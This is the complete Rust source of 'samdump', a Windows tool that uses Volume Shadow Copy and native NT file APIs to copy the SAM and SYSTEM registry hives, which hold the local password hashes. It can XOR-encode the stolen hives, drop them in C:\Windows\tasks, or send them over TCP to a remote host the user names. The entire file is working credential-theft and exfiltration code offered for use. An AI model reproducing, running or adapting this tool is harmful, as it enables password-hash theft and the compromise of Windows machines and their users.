use clap::Parser;
use std::io::Write;
use std::mem;
use std::net::TcpStream;
use std::ptr;

type HANDLE = *mut std::ffi::c_void;
type HRESULT = i32;
type NTSTATUS = i32;
type PVOID = *mut std::ffi::c_void;

const DEBUG_LEVEL: u32 = 1;

const FILE_READ_DATA: u32 = 0x0001;
const FILE_WRITE_DATA: u32 = 0x0002;
const FILE_READ_ATTRIBUTES: u32 = 0x0080;
const FILE_WRITE_ATTRIBUTES: u32 = 0x0100;
const SYNCHRONIZE: u32 = 0x00100000;
const FILE_SHARE_READ: u32 = 0x00000001;
const FILE_OPEN: u32 = 0x00000001;
const FILE_OVERWRITE_IF: u32 = 0x00000005;
const FILE_SYNCHRONOUS_IO_NONALERT: u32 = 0x00000020;
const FILE_ATTRIBUTE_NORMAL: u32 = 0x00000080;
const OBJ_CASE_INSENSITIVE: u32 = 0x00000040;

const COINIT_MULTITHREADED: u32 = 0x0;
const VSS_CTX_BACKUP: i32 = 0;
const VSS_CTX_ALL: i32 = -1;
const VSS_BT_FULL: i32 = 1;
const VSS_OBJ_NONE: i32 = 1;
const VSS_OBJ_SNAPSHOT: i32 = 3;

#[repr(C)]
#[derive(Clone, Copy, Default)]
struct GUID {
    data1: u32,
    data2: u16,
    data3: u16,
    data4: [u8; 8],
}

#[repr(C)]
struct UNICODE_STRING {
    length: u16,
    maximum_length: u16,
    buffer: *mut u16,
}

#[repr(C)]
struct OBJECT_ATTRIBUTES {
    length: u32,
    root_directory: HANDLE,
    object_name: *mut UNICODE_STRING,
    attributes: u32,
    security_descriptor: PVOID,
    security_quality_of_service: PVOID,
}

#[repr(C)]
struct IO_STATUS_BLOCK {
    status: u32,
    _padding: u32,
    information: usize,
}

#[repr(C)]
#[derive(Clone, Copy)]
struct VSS_SNAPSHOT_PROP {
    snapshot_id: GUID,
    snapshot_set_id: GUID,
    snapshots_count: i32,
    _padding1: i32,
    snapshot_device_object: *mut u16,
    original_volume_name: *mut u16,
    originating_machine: *mut u16,
    service_machine: *mut u16,
    exposed_name: *mut u16,
    exposed_path: *mut u16,
    provider_id: GUID,
    snapshot_attributes: i32,
    _padding2: i32,
    creation_timestamp: i64,
    status: i32,
    _padding3: i32,
}

#[repr(C)]
union VssObjectUnion {
    snap: mem::ManuallyDrop<VSS_SNAPSHOT_PROP>,
}

#[repr(C)]
struct VSS_OBJECT_PROP {
    obj_type: i32,
    _padding: i32,
    obj: VssObjectUnion,
}

// COM vtable structures
#[repr(C)]
struct IUnknownVtbl {
    query_interface: unsafe extern "system" fn(PVOID, *const GUID, *mut PVOID) -> HRESULT,
    add_ref: unsafe extern "system" fn(PVOID) -> u32,
    release: unsafe extern "system" fn(PVOID) -> u32,
}

#[repr(C)]
struct IVssEnumObjectVtbl {
    base: IUnknownVtbl,
    next: unsafe extern "system" fn(PVOID, u32, *mut VSS_OBJECT_PROP, *mut u32) -> HRESULT,
    skip: unsafe extern "system" fn(PVOID, u32) -> HRESULT,
    reset: unsafe extern "system" fn(PVOID) -> HRESULT,
    clone: unsafe extern "system" fn(PVOID, *mut PVOID) -> HRESULT,
}

#[repr(C)]
struct IVssAsyncVtbl {
    base: IUnknownVtbl,
    cancel: unsafe extern "system" fn(PVOID) -> HRESULT,
    wait: unsafe extern "system" fn(PVOID, u32) -> HRESULT,
    query_status: unsafe extern "system" fn(PVOID, *mut HRESULT, *mut i32) -> HRESULT,
}

#[repr(C)]
struct IVssBackupComponentsVtbl {
    base: IUnknownVtbl,
    get_writer_components_count: unsafe extern "system" fn(PVOID, *mut u32) -> HRESULT,
    get_writer_components: unsafe extern "system" fn(PVOID, u32, *mut PVOID) -> HRESULT,
    initialize_for_backup: unsafe extern "system" fn(PVOID, *const u16) -> HRESULT,
    set_backup_state: unsafe extern "system" fn(PVOID, i32, i32, i32, i32) -> HRESULT,
    initialize_for_restore: unsafe extern "system" fn(PVOID, *const u16) -> HRESULT,
    set_restore_state: unsafe extern "system" fn(PVOID, i32) -> HRESULT,
    gather_writer_metadata: unsafe extern "system" fn(PVOID, *mut PVOID) -> HRESULT,
    get_writer_metadata_count: unsafe extern "system" fn(PVOID, *mut u32) -> HRESULT,
    get_writer_metadata: unsafe extern "system" fn(PVOID, u32, *mut GUID, *mut PVOID) -> HRESULT,
    free_writer_metadata: unsafe extern "system" fn(PVOID) -> HRESULT,
    add_component: unsafe extern "system" fn(PVOID, *const GUID, *const GUID, i32, *const u16, *const u16) -> HRESULT,
    prepare_for_backup: unsafe extern "system" fn(PVOID, *mut PVOID) -> HRESULT,
    abort_backup: unsafe extern "system" fn(PVOID) -> HRESULT,
    gather_writer_status: unsafe extern "system" fn(PVOID, *mut PVOID) -> HRESULT,
    get_writer_status_count: unsafe extern "system" fn(PVOID, *mut u32) -> HRESULT,
    free_writer_status: unsafe extern "system" fn(PVOID) -> HRESULT,
    get_writer_status: unsafe extern "system" fn(PVOID, u32, *mut GUID, *mut GUID, *mut *mut u16, *mut i32, *mut i32, *mut i32, *mut *mut u16) -> HRESULT,
    set_backup_succeeded: unsafe extern "system" fn(PVOID, *const GUID, *const GUID, i32, *const u16, *const u16, i32) -> HRESULT,
    set_backup_options: unsafe extern "system" fn(PVOID, *const GUID, i32, *const u16, *const u16, *const u16) -> HRESULT,
    set_selected_for_restore: unsafe extern "system" fn(PVOID, *const GUID, i32, *const u16, *const u16, i32) -> HRESULT,
    set_restore_options: unsafe extern "system" fn(PVOID, *const GUID, i32, *const u16, *const u16, *const u16) -> HRESULT,
    set_additional_restores: unsafe extern "system" fn(PVOID, *const GUID, i32, *const u16, *const u16, i32) -> HRESULT,
    set_previous_backup_stamp: unsafe extern "system" fn(PVOID, *const GUID, i32, *const u16, *const u16, *const u16) -> HRESULT,
    save_as_xml: unsafe extern "system" fn(PVOID, *mut *mut u16) -> HRESULT,
    backup_complete: unsafe extern "system" fn(PVOID, *mut PVOID) -> HRESULT,
    add_alternative_location_mapping: unsafe extern "system" fn(PVOID, *const GUID, i32, *const u16, *const u16, *const u16, *const u16, i32, *const u16) -> HRESULT,
    add_restore_subcomponent: unsafe extern "system" fn(PVOID, *const GUID, i32, *const u16, *const u16, *const u16, *const u16, i32) -> HRESULT,
    set_file_restore_status: unsafe extern "system" fn(PVOID, *const GUID, i32, *const u16, *const u16, i32) -> HRESULT,
    add_new_target: unsafe extern "system" fn(PVOID, *const GUID, i32, *const u16, *const u16, *const u16, *const u16, i32, *const u16) -> HRESULT,
    set_ranges_file_path: unsafe extern "system" fn(PVOID, *const GUID, i32, *const u16, *const u16, u32, *const u16) -> HRESULT,
    pre_restore: unsafe extern "system" fn(PVOID, *mut PVOID) -> HRESULT,
    post_restore: unsafe extern "system" fn(PVOID, *mut PVOID) -> HRESULT,
    set_context: unsafe extern "system" fn(PVOID, i32) -> HRESULT,
    start_snapshot_set: unsafe extern "system" fn(PVOID, *mut GUID) -> HRESULT,
    add_to_snapshot_set: unsafe extern "system" fn(PVOID, *const u16, *const GUID, *mut GUID) -> HRESULT,
    do_snapshot_set: unsafe extern "system" fn(PVOID, *mut PVOID) -> HRESULT,
    delete_snapshots: unsafe extern "system" fn(PVOID, GUID, i32, i32, *mut i32, *mut GUID) -> HRESULT,
    import_snapshots: unsafe extern "system" fn(PVOID, *mut PVOID) -> HRESULT,
    break_snapshot_set: unsafe extern "system" fn(PVOID, *const GUID) -> HRESULT,
    get_snapshot_properties: unsafe extern "system" fn(PVOID, *const GUID, *mut VSS_SNAPSHOT_PROP) -> HRESULT,
    query: unsafe extern "system" fn(PVOID, *const GUID, i32, i32, *mut PVOID) -> HRESULT,
    is_volume_supported: unsafe extern "system" fn(PVOID, *const GUID, *const u16, *mut i32) -> HRESULT,
}

#[link(name = "ole32")]
extern "system" {
    fn CoInitializeEx(reserved: PVOID, co_init: u32) -> HRESULT;
    fn CoUninitialize();
}

#[link(name = "kernel32")]
extern "system" {
    fn LoadLibraryW(file_name: *const u16) -> HANDLE;
    fn GetProcAddress(module: HANDLE, proc_name: *const u8) -> PVOID;
    fn GetModuleHandleW(module_name: *const u16) -> HANDLE;
}

#[link(name = "shell32")]
extern "system" {
    fn IsUserAnAdmin() -> i32;
}

#[link(name = "ntdll")]
extern "system" {
    fn NtCreateFile(
        file_handle: *mut HANDLE,
        desired_access: u32,
        object_attributes: *mut OBJECT_ATTRIBUTES,
        io_status_block: *mut IO_STATUS_BLOCK,
        allocation_size: *mut i64,
        file_attributes: u32,
        share_access: u32,
        create_disposition: u32,
        create_options: u32,
        ea_buffer: PVOID,
        ea_length: u32,
    ) -> NTSTATUS;

    fn NtReadFile(
        file_handle: HANDLE,
        event: HANDLE,
        apc_routine: PVOID,
        apc_context: PVOID,
        io_status_block: *mut IO_STATUS_BLOCK,
        buffer: *mut u8,
        length: u32,
        byte_offset: *mut i64,
        key: *mut u32,
    ) -> NTSTATUS;

    fn NtWriteFile(
        file_handle: HANDLE,
        event: HANDLE,
        apc_routine: PVOID,
        apc_context: PVOID,
        io_status_block: *mut IO_STATUS_BLOCK,
        buffer: *const u8,
        length: u32,
        byte_offset: *mut i64,
        key: *mut u32,
    ) -> NTSTATUS;

    fn NtClose(handle: HANDLE) -> NTSTATUS;
}

type CreateVssBackupComponentsFn = unsafe extern "system" fn(*mut PVOID) -> HRESULT;
type VssFreeSnapshotPropertiesFn = unsafe extern "system" fn(*mut VSS_SNAPSHOT_PROP);

#[derive(Parser)]
#[command(name = "samdump")]
#[command(about = "Extract SAM and SYSTEM files using VSS")]
struct Args {
    #[arg(long, help = "Save files locally")]
    save_local: bool,

    #[arg(long, default_value = "C:\\Windows\\tasks", help = "Output directory")]
    output_dir: String,

    #[arg(long, help = "Send files remotely")]
    send_remote: bool,

    #[arg(long, default_value = "127.0.0.1", help = "Host for remote sending")]
    host: String,

    #[arg(long, default_value_t = 7777, help = "Port for remote sending")]
    port: u16,

    #[arg(long, help = "XOR encode files")]
    xor_encode: bool,

    #[arg(long, default_value = "SAMDump2025", help = "XOR key")]
    xor_key: String,

    #[arg(long, default_value = "C:\\", help = "Disk for shadow copy")]
    disk: String,
}

fn to_wide(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(Some(0)).collect()
}

fn wide_to_string(ptr: *const u16) -> String {
    if ptr.is_null() {
        return String::new();
    }
    unsafe {
        let mut len = 0;
        let mut p = ptr;
        while *p != 0 {
            len += 1;
            p = p.add(1);
        }
        let slice = std::slice::from_raw_parts(ptr, len);
        String::from_utf16_lossy(slice)
    }
}

fn load_vss_functions() -> Option<(CreateVssBackupComponentsFn, VssFreeSnapshotPropertiesFn)> {
    unsafe {
        let dll_name = to_wide("VssApi.dll");
        let vss_handle = LoadLibraryW(dll_name.as_ptr());
        if vss_handle.is_null() {
            return None;
        }

        let possible_names = [
            b"CreateVssBackupComponentsInternal\0".as_ptr(),
            b"CreateVssBackupComponents\0".as_ptr(),
            b"?CreateVssBackupComponents@@YAJPEAPEAVIVssBackupComponents@@@Z\0".as_ptr(),
        ];

        let mut create_fn: PVOID = ptr::null_mut();
        for name in &possible_names {
            create_fn = GetProcAddress(vss_handle, *name);
            if !create_fn.is_null() {
                break;
            }
        }

        if create_fn.is_null() {
            return None;
        }

        let free_fn = GetProcAddress(vss_handle, b"VssFreeSnapshotProperties\0".as_ptr());
        if free_fn.is_null() {
            return None;
        }

        Some((
            mem::transmute::<PVOID, CreateVssBackupComponentsFn>(create_fn),
            mem::transmute::<PVOID, VssFreeSnapshotPropertiesFn>(free_fn),
        ))
    }
}

fn vss_async_wait(async_ptr: PVOID) {
    if async_ptr.is_null() {
        return;
    }
    unsafe {
        let vtbl_ptr = *(async_ptr as *const *const IVssAsyncVtbl);
        ((*vtbl_ptr).wait)(async_ptr, 0xFFFFFFFF);
        ((*vtbl_ptr).base.release)(async_ptr);
    }
}

fn list_shadows(
    create_fn: CreateVssBackupComponentsFn,
    free_fn: VssFreeSnapshotPropertiesFn,
) -> Option<String> {
    unsafe {
        let hr = CoInitializeEx(ptr::null_mut(), COINIT_MULTITHREADED);
        if hr < 0 && hr != -2147417850 {
            return None;
        }

        let mut backup: PVOID = ptr::null_mut();
        let hr = create_fn(&mut backup);
        if hr < 0 || backup.is_null() {
            CoUninitialize();
            return None;
        }

        let vtbl = *(backup as *const *const IVssBackupComponentsVtbl);

        let hr = ((*vtbl).initialize_for_backup)(backup, ptr::null());
        if hr < 0 {
            ((*vtbl).base.release)(backup);
            CoUninitialize();
            return None;
        }

        let mut hr = ((*vtbl).set_context)(backup, VSS_CTX_ALL);
        if hr < 0 {
            hr = ((*vtbl).set_context)(backup, VSS_CTX_BACKUP);
            if hr < 0 {
                ((*vtbl).base.release)(backup);
                CoUninitialize();
                return None;
            }
        }

        let guid_null = GUID::default();
        let mut enum_ptr: PVOID = ptr::null_mut();
        let hr = ((*vtbl).query)(backup, &guid_null, VSS_OBJ_NONE, VSS_OBJ_SNAPSHOT, &mut enum_ptr);
        if hr < 0 || enum_ptr.is_null() {
            ((*vtbl).base.release)(backup);
            CoUninitialize();
            return None;
        }

        let enum_vtbl = *(enum_ptr as *const *const IVssEnumObjectVtbl);
        let mut result: Option<String> = None;

        loop {
            let mut prop: VSS_OBJECT_PROP = mem::zeroed();
            let mut fetched: u32 = 0;
            let hr = ((*enum_vtbl).next)(enum_ptr, 1, &mut prop, &mut fetched);
            if hr != 0 || fetched == 0 {
                break;
            }

            if prop.obj_type == VSS_OBJ_SNAPSHOT {
                let snap = &*prop.obj.snap;
                if !snap.snapshot_device_object.is_null() {
                    let device = wide_to_string(snap.snapshot_device_object);
                    let mut snap_copy = *snap;
                    free_fn(&mut snap_copy);
                    result = Some(device);
                    break;
                }
                let mut snap_copy = *snap;
                free_fn(&mut snap_copy);
            }
        }

        ((*enum_vtbl).base.release)(enum_ptr);
        ((*vtbl).base.release)(backup);
        CoUninitialize();
        result
    }
}

fn create_shadow(
    volume_path: &str,
    create_fn: CreateVssBackupComponentsFn,
    free_fn: VssFreeSnapshotPropertiesFn,
) -> Option<String> {
    unsafe {
        if DEBUG_LEVEL >= 1 {
            println!("[+] Creating Shadow Copy for: {}", volume_path);
        }

        let hr = CoInitializeEx(ptr::null_mut(), COINIT_MULTITHREADED);
        if hr < 0 && hr != -2147417850 {
            return None;
        }

        let mut backup: PVOID = ptr::null_mut();
        let hr = create_fn(&mut backup);
        if hr < 0 || backup.is_null() {
            CoUninitialize();
            return None;
        }

        let vtbl = *(backup as *const *const IVssBackupComponentsVtbl);

        let hr = ((*vtbl).initialize_for_backup)(backup, ptr::null());
        if hr < 0 {
            ((*vtbl).base.release)(backup);
            CoUninitialize();
            return None;
        }

        let guid_null = GUID::default();
        let vol_wide = to_wide(volume_path);

        let mut is_supported: i32 = 0;
        let hr = ((*vtbl).is_volume_supported)(backup, &guid_null, vol_wide.as_ptr(), &mut is_supported);
        if hr == 0 && is_supported == 0 {
            println!("[-] ERROR: Volume does not support VSS");
            ((*vtbl).base.release)(backup);
            CoUninitialize();
            return None;
        }

        let hr = ((*vtbl).set_context)(backup, VSS_CTX_BACKUP);
        if hr < 0 {
            ((*vtbl).base.release)(backup);
            CoUninitialize();
            return None;
        }

        ((*vtbl).set_backup_state)(backup, 0, 0, VSS_BT_FULL, 0);

        let mut async_metadata: PVOID = ptr::null_mut();
        let hr = ((*vtbl).gather_writer_metadata)(backup, &mut async_metadata);
        if hr >= 0 {
            vss_async_wait(async_metadata);
        }

        let mut snapshot_set_id = GUID::default();
        let hr = ((*vtbl).start_snapshot_set)(backup, &mut snapshot_set_id);
        if hr < 0 {
            ((*vtbl).base.release)(backup);
            CoUninitialize();
            return None;
        }

        let mut snapshot_id = GUID::default();
        let hr = ((*vtbl).add_to_snapshot_set)(backup, vol_wide.as_ptr(), &guid_null, &mut snapshot_id);
        if hr < 0 {
            ((*vtbl).base.release)(backup);
            CoUninitialize();
            return None;
        }

        let mut async_prepare: PVOID = ptr::null_mut();
        let hr = ((*vtbl).prepare_for_backup)(backup, &mut async_prepare);
        if hr >= 0 {
            vss_async_wait(async_prepare);
        }

        let mut async_snapshot: PVOID = ptr::null_mut();
        let hr = ((*vtbl).do_snapshot_set)(backup, &mut async_snapshot);
        if hr < 0 {
            ((*vtbl).base.release)(backup);
            CoUninitialize();
            return None;
        }
        vss_async_wait(async_snapshot);

        let mut snap_prop: VSS_SNAPSHOT_PROP = mem::zeroed();
        let hr = ((*vtbl).get_snapshot_properties)(backup, &snapshot_id, &mut snap_prop);
        let result = if hr >= 0 && !snap_prop.snapshot_device_object.is_null() {
            let device = wide_to_string(snap_prop.snapshot_device_object);
            free_fn(&mut snap_prop);
            Some(device)
        } else {
            None
        };

        ((*vtbl).base.release)(backup);
        CoUninitialize();
        result
    }
}

fn open_file_nt(file_path: &str) -> HANDLE {
    unsafe {
        let mut wide_path = to_wide(file_path);

        let mut unicode_string = UNICODE_STRING {
            length: ((wide_path.len() - 1) * 2) as u16,
            maximum_length: (wide_path.len() * 2) as u16,
            buffer: wide_path.as_mut_ptr(),
        };

        let mut object_attributes = OBJECT_ATTRIBUTES {
            length: mem::size_of::<OBJECT_ATTRIBUTES>() as u32,
            root_directory: ptr::null_mut(),
            object_name: &mut unicode_string,
            attributes: OBJ_CASE_INSENSITIVE,
            security_descriptor: ptr::null_mut(),
            security_quality_of_service: ptr::null_mut(),
        };

        let mut io_status: IO_STATUS_BLOCK = mem::zeroed();
        let mut file_handle: HANDLE = ptr::null_mut();

        let status = NtCreateFile(
            &mut file_handle,
            FILE_READ_DATA | FILE_READ_ATTRIBUTES | SYNCHRONIZE,
            &mut object_attributes,
            &mut io_status,
            ptr::null_mut(),
            0,
            FILE_SHARE_READ,
            FILE_OPEN,
            FILE_SYNCHRONOUS_IO_NONALERT,
            ptr::null_mut(),
            0,
        );

        if status != 0 {
            ptr::null_mut()
        } else {
            file_handle
        }
    }
}

fn read_bytes_nt(file_handle: HANDLE) -> Vec<u8> {
    let mut file_content = Vec::new();
    let mut byte_offset: i64 = 0;

    unsafe {
        loop {
            let mut buffer = [0u8; 4096];
            let mut io_status: IO_STATUS_BLOCK = mem::zeroed();

            let status = NtReadFile(
                file_handle,
                ptr::null_mut(),
                ptr::null_mut(),
                ptr::null_mut(),
                &mut io_status,
                buffer.as_mut_ptr(),
                buffer.len() as u32,
                &mut byte_offset,
                ptr::null_mut(),
            );

            if status as u32 == 0xC0000011 {
                break;
            }

            if status != 0 && status != 0x103 {
                break;
            }

            let bytes_read = io_status.information as u32;
            if bytes_read == 0 {
                break;
            }

            file_content.extend_from_slice(&buffer[..bytes_read as usize]);
            byte_offset += bytes_read as i64;
        }
    }

    file_content
}

fn read_file(file_path: &str, print_info: bool) -> Vec<u8> {
    let file_handle = open_file_nt(file_path);
    if file_handle.is_null() {
        if print_info {
            println!("[-] Error: Not possible to open the file.");
        }
        return Vec::new();
    }

    let content = read_bytes_nt(file_handle);
    if DEBUG_LEVEL >= 1 && print_info {
        println!("[+] Read {} bytes from {}", content.len(), file_path);
    }

    unsafe {
        NtClose(file_handle);
    }
    content
}

fn write_file_nt(file_path: &str, data: &[u8]) -> bool {
    unsafe {
        let mut wide_path = to_wide(file_path);

        let mut unicode_string = UNICODE_STRING {
            length: ((wide_path.len() - 1) * 2) as u16,
            maximum_length: (wide_path.len() * 2) as u16,
            buffer: wide_path.as_mut_ptr(),
        };

        let mut object_attributes = OBJECT_ATTRIBUTES {
            length: mem::size_of::<OBJECT_ATTRIBUTES>() as u32,
            root_directory: ptr::null_mut(),
            object_name: &mut unicode_string,
            attributes: OBJ_CASE_INSENSITIVE,
            security_descriptor: ptr::null_mut(),
            security_quality_of_service: ptr::null_mut(),
        };

        let mut io_status: IO_STATUS_BLOCK = mem::zeroed();
        let mut file_handle: HANDLE = ptr::null_mut();

        let status = NtCreateFile(
            &mut file_handle,
            FILE_WRITE_DATA | FILE_WRITE_ATTRIBUTES | SYNCHRONIZE,
            &mut object_attributes,
            &mut io_status,
            ptr::null_mut(),
            FILE_ATTRIBUTE_NORMAL,
            FILE_SHARE_READ,
            FILE_OVERWRITE_IF,
            FILE_SYNCHRONOUS_IO_NONALERT,
            ptr::null_mut(),
            0,
        );

        if status != 0 {
            println!("[-] Error creating file: {}. NTSTATUS: 0x{:08X}", file_path, status as u32);
            return false;
        }

        let mut byte_offset: i64 = 0;
        let status = NtWriteFile(
            file_handle,
            ptr::null_mut(),
            ptr::null_mut(),
            ptr::null_mut(),
            &mut io_status,
            data.as_ptr(),
            data.len() as u32,
            &mut byte_offset,
            ptr::null_mut(),
        );

        if status != 0 {
            println!("[-] Error writing to file: {}. NTSTATUS: 0x{:08X}", file_path, status as u32);
            NtClose(file_handle);
            return false;
        }

        if DEBUG_LEVEL >= 1 {
            println!("[+] Written {} bytes to {}", data.len(), file_path);
        }

        NtClose(file_handle);
        true
    }
}

fn encode_bytes(data: &[u8], key: &str) -> Vec<u8> {
    if key.is_empty() {
        return data.to_vec();
    }

    let key_bytes = key.as_bytes();
    data.iter()
        .enumerate()
        .map(|(i, &b)| b ^ key_bytes[i % key_bytes.len()])
        .collect()
}

fn save_files_locally(sam_data: &[u8], system_data: &[u8], base_path: &str) -> bool {
    let sam_path = format!("\\??\\{}\\sam.txt", base_path);
    let system_path = format!("\\??\\{}\\system.txt", base_path);

    let mut success = true;
    if !write_file_nt(&sam_path, sam_data) {
        println!("[-] Error storing SAM");
        success = false;
    }
    if !write_file_nt(&system_path, system_data) {
        println!("[-] Error storing SYSTEM");
        success = false;
    }
    success
}

fn send_file_over_socket(stream: &mut TcpStream, filename: &str, filedata: &[u8]) -> bool {
    let mut header = [0u8; 40];

    let name_bytes = filename.as_bytes();
    let copy_len = name_bytes.len().min(32);
    header[..copy_len].copy_from_slice(&name_bytes[..copy_len]);

    let filesize = (filedata.len() as u32).to_be_bytes();
    header[32..36].copy_from_slice(&filesize);

    if stream.write_all(&header).is_err() {
        println!("[-] Error sending header for {}", filename);
        return false;
    }

    if stream.write_all(filedata).is_err() {
        println!("[-] Error sending data for {}", filename);
        return false;
    }

    if DEBUG_LEVEL >= 1 {
        println!("[+] {} sent ({} bytes)", filename, filedata.len());
    }
    true
}

fn send_files_remotely(sam_data: &[u8], system_data: &[u8], host: &str, port: u16) -> bool {
    let addr = format!("{}:{}", host, port);
    let mut stream = match TcpStream::connect(&addr) {
        Ok(s) => s,
        Err(e) => {
            println!("[-] Error connecting to {}: {}", addr, e);
            return false;
        }
    };

    if DEBUG_LEVEL >= 1 {
        println!("[+] Connected to {}", addr);
    }

    let mut success = true;
    success &= send_file_over_socket(&mut stream, "SAM", sam_data);
    success &= send_file_over_socket(&mut stream, "SYSTEM", system_data);
    success
}

fn main() {
    let args = Args::parse();

    if !args.save_local && !args.send_remote {
        println!("Usage: samdump.exe [OPTIONS]");
        println!("Options:");
        println!("  --save-local           Save locally (default: false)");
        println!("  --output-dir DIR       Output directory (default: C:\\Windows\\tasks)");
        println!("  --send-remote          Send remotely (default: false)");
        println!("  --host IP              Host for remote sending (default: 127.0.0.1)");
        println!("  --port PORT            Port for remote sending (default: 7777)");
        println!("  --xor-encode           XOR Encode (default: false)");
        println!("  --xor-key KEY          XOR key (default: SAMDump2025)");
        println!("  --disk DISK            Disk for shadow copy (default: C:\\)");
        println!("  --help                 Show this help");
        std::process::exit(0);
    }

    unsafe {
        if IsUserAnAdmin() == 0 {
            println!("ERROR: Administrator privileges required");
            std::process::exit(1);
        }
    }

    let (create_fn, free_fn) = match load_vss_functions() {
        Some(fns) => fns,
        None => {
            println!("[-] Error: Could not load VSS functions from VssApi.dll");
            std::process::exit(1);
        }
    };

    let mut shadow_base_path;
    let mut new_shadow_created = false;

    if let Some(device) = list_shadows(create_fn, free_fn) {
        if DEBUG_LEVEL >= 1 {
            println!("[+] Shadow Copy found: {}", device);
        }
        shadow_base_path = device;
    } else {
        if DEBUG_LEVEL >= 1 {
            println!("[+] No Shadow Copies found: Creating a new one.");
        }
        match create_shadow(&args.disk, create_fn, free_fn) {
            Some(device) => {
                println!("[+] Shadow copy created: {}", device);
                shadow_base_path = device;
                new_shadow_created = true;
            }
            None => {
                println!("\n[-] Failed to create a Shadow copy.");
                std::process::exit(1);
            }
        }
    }

    shadow_base_path = shadow_base_path.replace("\\\\?\\", "\\??\\");

    let sam_path = format!("{}\\windows\\system32\\config\\sam", shadow_base_path);
    let system_path = format!("{}\\windows\\system32\\config\\system", shadow_base_path);

    let mut sam_bytes = read_file(&sam_path, true);
    let mut system_bytes = read_file(&system_path, true);

    if new_shadow_created {
        sam_bytes = read_file(&sam_path, false);
        system_bytes = read_file(&system_path, false);
    }

    if args.xor_encode {
        sam_bytes = encode_bytes(&sam_bytes, &args.xor_key);
        system_bytes = encode_bytes(&system_bytes, &args.xor_key);
        if DEBUG_LEVEL >= 1 {
            println!("[+] XOR-encoded SAM and SYSTEM content");
        }
    }

    if args.save_local {
        if save_files_locally(&sam_bytes, &system_bytes, &args.output_dir) {
            if DEBUG_LEVEL >= 1 {
                println!("[+] Success saving files locally");
            }
        } else {
            println!("[-] Error saving files locally");
        }
    }

    if args.send_remote {
        if send_files_remotely(&sam_bytes, &system_bytes, &args.host, args.port) {
            if DEBUG_LEVEL >= 1 {
                println!("[+] Success sending files");
            }
        } else {
            println!("[-] Error sending files");
        }
    }
}
